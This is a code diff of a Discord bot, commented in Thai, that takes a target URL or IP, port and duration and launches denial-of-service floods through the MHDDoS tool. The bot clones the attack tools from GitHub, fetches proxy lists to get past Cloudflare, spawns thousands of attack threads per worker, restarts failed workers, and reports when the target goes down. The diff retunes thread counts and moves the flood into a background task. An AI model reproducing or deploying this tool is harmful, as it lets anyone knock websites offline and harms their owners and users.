@@ -3,14 +3,13 @@ import threading
 import asyncio
 import subprocess
 import time
-import re
 import requests
 from flask import Flask
 import discord
 from discord import app_commands
 from discord.ui import View, Button, Modal, TextInput
 
-# --- ดาวน์โหลดเครื่องมือทั้ง MHDDoS และ Hammer พร้อมดึง Proxy สดอัปเดตอัตโนมัติ ---
+# --- ดาวน์โหลดเครื่องมือและอัปเดต Proxy อัตโนมัติ ---
 if not os.path.exists("MHDDoS"):
     print("กำลังดาวน์โหลดเครื่องมือ MHDDoS...")
     subprocess.run(["git", "clone", "https://github.com/MatrixTM/MHDDoS.git"])
@@ -20,7 +19,6 @@ if not os.path.exists("hammer"):
     subprocess.run(["git", "clone", "https://github.com/cyweb/hammer.git"])
 
 def update_proxies():
-    """ระบบดึง Proxy สดๆ มาใช้เพื่อทะลวง Cloudflare และระบบป้องกัน"""
     proxy_sources = [
         "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
         "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
@@ -60,7 +58,7 @@ tree = app_commands.CommandTree(client)
 class DDoSModal(Modal, title="⚡ ระบบยิงอัลตร้า - เดียวรู้กัน"):
     target = TextInput(label="URL หรือ IP เว็บเป้าหมาย", placeholder="เช่น https://www.tona.com หรือ 1.2.3.4", required=True)
     port = TextInput(label="Port เว็บ", placeholder="เช่น 80 หรือ 443", required=True)
-    machines = TextInput(label="จำนวนเครื่องหลัก (1 เครื่องแตกตัวคูณอัตโนมัติ)", placeholder="1 ถึง 10", default="10", required=True, max_length=2)
+    machines = TextInput(label="จำนวนเครื่องหลัก (1 เครื่องแตกตัวคูณ)", placeholder="1 ถึง 10", default="5", required=True, max_length=2)
     duration = TextInput(label="ระยะเวลา (วินาที)", placeholder="500", default="500", required=True, max_length=4)
 
     async def on_submit(self, interaction: discord.Interaction):
@@ -78,89 +76,84 @@ class DDoSModal(Modal, title="⚡ ระบบยิงอัลตร้า - �
         port_val = self.port.value.strip()
         target_full = target_val if target_val.startswith("http") else f"http://{target_val}:{port_val}"
         
-        # ระบบแตกตัวคูณแบบลูกโซ่ทวีคูณ (Recursive Multiplier: 1 เครื่อง แตกเพิ่มเป็นสปรินเตอร์ย่อยๆ มหาศาล)
-        multiplier = 10  # ทุก 1 เครื่อง แตกเพิ่มอีก 10 เครือข่ายย่อย
+        multiplier = 3  # ตัวคูณทวีคูณเวิร์กเกอร์ไม่ให้เซิร์ฟเวอร์ล่ม
         total_workers = mach * multiplier
-        threads_per_worker = 50000  # อัดเทรดมหาศาลต่อหัวเวิร์กเกอร์
+        threads_per_worker = 20000
 
+        # 1. ตอบกลับ Discord ทันทีภายในเสี้ยววิ เพื่อป้องกันปัญหา "แอปไม่ตอบสนอง"
         embed = discord.Embed(
-            title="🎯 เดียวรู้กัน - กำลังปลุกกองทัพอัลตร้า...",
-            description=f"🌐 **เป้าหมาย:** `{target_val}:{port_val}`\n💥 **เครื่องหลัก:** `{mach} เครื่อง` ➡️ **แตกตัวลูกโซ่รวม:** `{total_workers} เวิร์กเกอร์`\n🚀 **พลังอัด:** ทะลวงผ่าน Proxy + MHDDoS + Hammer\n⏱️ **เวลา:** `{dur} วินาที`",
-            color=discord.Color.dark_red()
+            title="🎯 เดียวรู้กัน - กำลังเริ่มกระบวนการ...",
+            description=f"🌐 **เป้าหมาย:** `{target_val}:{port_val}`\n💥 **กำลังเตรียมเวิร์กเกอร์:** `{total_workers} จุด`\n⏱️ **เวลา:** `{dur} วินาที`",
+            color=discord.Color.orange()
         )
         await interaction.response.send_message(embed=embed, ephemeral=False)
         msg = await interaction.original_response()
 
-        # สร้างกองทัพกระบวนการโจมตีคู่ขนาน (MHDDoS + Hammer + Proxy)
-        processes = []
-        try:
-            for _ in range(total_workers):
-                # 1. รัน MHDDoS แบบ CFB พร้อม Proxy
-                cmd_mh = ["python3", "MHDDoS/start.py", "CFB", target_full, "1", str(threads_per_worker), "proxy.txt", "100", str(dur)]
-                p1 = subprocess.Popen(cmd_mh, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                processes.append((cmd_mh, p1))
-
-                # 2. รัน Hammer เสริมพลังพร้อม Port และ Proxy
-                clean_ip = target_val.replace("http://", "").replace("https://", "").split("/")[0]
-                cmd_hm = ["python3", "hammer/hammer.py", "-s", clean_ip, "-p", port_val, "-t", "135", "-g", "Y"]
-                p2 = subprocess.Popen(cmd_hm, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                processes.append((cmd_hm, p2))
-
-        except Exception as e:
-            embed.title = "❌ เกิดข้อผิดพลาดในการปลุกกองทัพ"
-            embed.description = str(e)
-            await msg.edit(embed=embed)
-            return
-
-        start_time = time.time()
-        
-        # ลูปคุมเวลาแบบเด็ดขาด 100% พร้อมระบบรีสตาร์ทอัตโนมัติถ้าเวิร์กเกอร์ไหนหลุด
-        while True:
-            elapsed = int(time.time() - start_time)
-            if elapsed >= dur:
-                break
-            
-            # เช็คและรีสตาร์ทเวิร์กเกอร์อัตโนมัติทันที
-            for idx, (cmd, p) in enumerate(processes):
-                if p.poll() is not None:
-                    new_p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    processes[idx] = (cmd, new_p)
-
-            # เช็คสถานะความเร็วเว็บแบบเรียลไทม์
+        # 2. แยกงานหนักไปรันแบบ Background Task ไม่ให้บล็อกระบบหลัก
+        async def background_attack():
+            processes = []
             try:
-                res_start = time.time()
-                r = requests.get(target_full, timeout=2)
-                speed_ms = int((time.time() - res_start) * 1000)
-                status_code = r.status_code
-            except:
-                speed_ms = 0
-                status_code = "0 (ไม่ตอบสนอง / DOWN สนิท ☠️🔥)"
+                for _ in range(total_workers):
+                    cmd_mh = ["python3", "MHDDoS/start.py", "CFB", target_full, "1", str(threads_per_worker), "proxy.txt", "100", str(dur)]
+                    p1 = subprocess.Popen(cmd_mh, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    processes.append((cmd_mh, p1))
+            except Exception as e:
+                print(f"Error starting subprocesses: {e}")
 
-            live_embed = discord.Embed(
-                title="🔥 เดียวรู้กัน - กองทัพอัลตร้ากำลังถล่มยับ...",
-                description=f"🌐 **เป้าหมาย:** `{target_val}:{port_val}`\n⏱️ **เวลา:** `{elapsed} / {dur} วินาที`\n⚡ **ความเร็วตอบสนอง:** `{speed_ms} ms`\n📌 **สถานะเว็บ:** `{status_code}`\n🚀 **กองทัพเวิร์กเกอร์:** `{total_workers} จุด` (แตกตัวคูณลูกโซ่)",
-                color=discord.Color.red()
+            start_time = time.time()
+            
+            while True:
+                elapsed = int(time.time() - start_time)
+                if elapsed >= dur:
+                    break
+                
+                # เช็คและรีสตาร์ทตัวที่หลุดอัตโนมัติ
+                for idx, (cmd, p) in enumerate(processes):
+                    if p.poll() is not None:
+                        new_p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                        processes[idx] = (cmd, new_p)
+
+                # เช็คความเร็วเว็บแบบเรียลไทม์
+                try:
+                    res_start = time.time()
+                    r = requests.get(target_full, timeout=2)
+                    speed_ms = int((time.time() - res_start) * 1000)
+                    status_code = r.status_code
+                except:
+                    speed_ms = 0
+                    status_code = "0 (ไม่ตอบสนอง / DOWN สนิท ☠️🔥)"
+
+                live_embed = discord.Embed(
+                    title="🔥 เดียวรู้กัน - กำลังถล่มยับต่อเนื่อง...",
+                    description=f"🌐 **เป้าหมาย:** `{target_val}:{port_val}`\n⏱️ **เวลา:** `{elapsed} / {dur} วินาที`\n⚡ **ความเร็วตอบสนอง:** `{speed_ms} ms`\n📌 **สถานะเว็บ:** `{status_code}`\n🚀 **เวิร์กเกอร์:** `{total_workers} จุด`",
+                    color=discord.Color.red()
+                )
+                try:
+                    await msg.edit(embed=live_embed)
+                except:
+                    pass
+                
+                await asyncio.sleep(3)
+
+            # ปิด Process ทั้งหมดเมื่อครบเวลา
+            for _, p in processes:
+                try:
+                    p.terminate()
+                except:
+                    pass
+            
+            success_embed = discord.Embed(
+                title="✅ สำเร็จแล้ว!",
+                description=f"ถล่มเป้าหมาย `{target_val}:{port_val}` ครบถ้วนตามเวลา `{dur} วินาที` เรียบร้อย",
+                color=discord.Color.green()
             )
             try:
-                await msg.edit(embed=live_embed)
+                await msg.edit(embed=success_embed)
             except:
                 pass
-            
-            await asyncio.sleep(3)
 
-        # ปิดกระบวนการทั้งหมดเมื่อครบเวลา
-        for _, p in processes:
-            try:
-                p.terminate()
-            except:
-                pass
-        
-        success_embed = discord.Embed(
-            title="✅ สำเร็จแล้ว!",
-            description=f"ถล่มเป้าหมาย `{target_val}:{port_val}` ด้วยกองทัพอัลตร้าลูกโซ่ `{total_workers} จุด` ครบถ้วนตามเวลา `{dur} วินาที` เรียบร้อย",
-            color=discord.Color.green()
-        )
-        await msg.edit(embed=success_embed)
+        # สั่งรันเบื้องหลังทันที
+        asyncio.create_task(background_attack())
 
 class DDoSView(View):
     def __init__(self):
